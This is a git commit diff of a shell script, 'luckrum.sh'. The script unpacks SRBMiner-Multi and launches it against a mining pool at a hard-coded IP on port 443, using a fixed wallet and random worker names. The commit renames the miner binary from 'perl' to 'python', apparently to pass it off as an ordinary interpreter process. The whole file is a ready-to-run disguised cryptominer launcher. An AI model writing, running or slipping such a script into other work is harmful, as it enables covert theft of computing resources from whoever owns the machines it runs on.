5663a77bc326af9ecb642c958008631a3a351402
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-12 14:29:44 +0700

    Update luckrum.sh

--- luckrum.sh
+++ luckrum.sh
@@ -4,10 +4,10 @@ tar -xvf kontolrum
 
 cd SRBMiner-Multi-2-4-7
 
-mv SRBMiner-MULTI perl
+mv SRBMiner-MULTI python
 
 nomer=$((RANDOM % 50 + 1))
 
 clear
 
-./perl --algorithm aurum --pool 103.120.18.210:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
+./python --algorithm aurum --pool 103.120.18.210:443 --wallet waf1qd2ect4ut9nqq8w54ymsuxfh0ea93zjkkhyyu74.DOT-0$nomer --keepalive true 
